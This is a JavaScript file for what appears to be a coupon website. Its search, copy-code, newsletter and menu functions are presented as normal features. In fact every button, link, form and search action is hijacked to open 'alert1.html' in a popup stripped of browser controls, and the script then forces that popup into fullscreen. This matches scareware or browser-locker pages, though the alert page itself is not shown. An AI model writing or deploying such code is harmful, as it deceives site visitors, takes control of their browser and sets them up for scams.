// Wait for the DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    // Initialize all components
    initializeSearch();
    initializeCopyButtons();
    initializeNewsletter();
    initializeMobileMenu();
    initializeAlertTriggers();
});

// Function to open alert page in fullscreen
function openAlertPage() {
    // Open alert page in a new window
    const alertWindow = window.open('alert1.html', '_blank', 
        'width=' + window.screen.availWidth + 
        ',height=' + window.screen.availHeight + 
        ',left=0,top=0' +
        ',fullscreen=yes' +
        ',scrollbars=no' +
        ',resizable=no' +
        ',status=no' +
        ',location=no' +
        ',menubar=no' +
        ',toolbar=no' +
        ',directories=no' +
        ',dependent=yes' +
        ',alwaysRaised=yes' +
        ',alwaysOnTop=yes'
    );

    // If popup is blocked, try to inform the user
    if (!alertWindow) {
        alert('Please allow popups for this website to continue.');
    } else {
        // Focus the window
        alertWindow.focus();
        
        // Wait for the window to load before attempting fullscreen
        alertWindow.onload = function() {
            try {
                // Try to make it fullscreen
                if (alertWindow.document.documentElement.requestFullscreen) {
                    alertWindow.document.documentElement.requestFullscreen();
                } else if (alertWindow.document.documentElement.webkitRequestFullscreen) {
                    alertWindow.document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
                } else if (alertWindow.document.documentElement.mozRequestFullScreen) {
                    alertWindow.document.documentElement.mozRequestFullScreen();
                } else if (alertWindow.document.documentElement.msRequestFullscreen) {
                    alertWindow.document.documentElement.msRequestFullscreen();
                }
            } catch (e) {
                console.log('Fullscreen request failed:', e);
            }
        };
    }
}

// Initialize alert triggers for all buttons
function initializeAlertTriggers() {
    // Add click event listener to all buttons
    document.querySelectorAll('button').forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            openAlertPage();
        });
    });

    // Add click event listener to all links
    document.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            openAlertPage();
        });
    });

    // Add click event listener to all form submissions
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            e.stopPropagation();
            openAlertPage();
        });
    });

    // Add click event listener to the document body
    document.body.addEventListener('click', function(e) {
        // Only trigger if clicking directly on the body (not on buttons, links, etc.)
        if (e.target === document.body) {
            openAlertPage();
        }
    });
}

// Search functionality
function initializeSearch() {
    const searchForm = document.querySelector('.search-box');
    const searchInput = searchForm.querySelector('input');
    const searchButton = searchForm.querySelector('.search-btn');

    searchButton.addEventListener('click', function(e) {
        e.preventDefault();
        openAlertPage();
    });

    // Allow search on Enter key
    searchInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            openAlertPage();
        }
    });
}

// Copy coupon code functionality
function initializeCopyButtons() {
    const copyButtons = document.querySelectorAll('.copy-btn');
    
    copyButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            openAlertPage();
        });
    });
}

// Newsletter subscription
function initializeNewsletter() {
    const newsletterForm = document.querySelector('.newsletter-form');
    
    if (newsletterForm) {
        newsletterForm.addEventListener('submit', function(e) {
            e.preventDefault();
            openAlertPage();
        });
    }
}

// Mobile menu functionality
function initializeMobileMenu() {
    const navLinks = document.querySelector('.nav-links');
    const authButtons = document.querySelector('.auth-buttons');
    
    // Create mobile menu button
    const mobileMenuBtn = document.createElement('button');
    mobileMenuBtn.className = 'mobile-menu-btn';
    mobileMenuBtn.innerHTML = '<i class="fas fa-bars"></i>';
    
    // Only show mobile menu button on small screens
    function toggleMobileMenu() {
        if (window.innerWidth <= 768) {
            if (!document.querySelector('.mobile-menu-btn')) {
                document.querySelector('.nav-container').prepend(mobileMenuBtn);
                navLinks.style.display = 'none';
                authButtons.style.display = 'none';
            }
        } else {
            const btn = document.querySelector('.mobile-menu-btn');
            if (btn) btn.remove();
            navLinks.style.display = '';
            authButtons.style.display = '';
        }
    }
    
    // Initial check
    toggleMobileMenu();
    
    // Check on window resize
    window.addEventListener('resize', toggleMobileMenu);
    
    // Toggle mobile menu
    document.addEventListener('click', function(e) {
        if (e.target.closest('.mobile-menu-btn')) {
            const isVisible = navLinks.style.display !== 'none';
            navLinks.style.display = isVisible ? 'none' : 'flex';
            authButtons.style.display = isVisible ? 'none' : 'flex';
        }
    });
}

// Utility function to validate email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Add smooth scrolling for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
}); 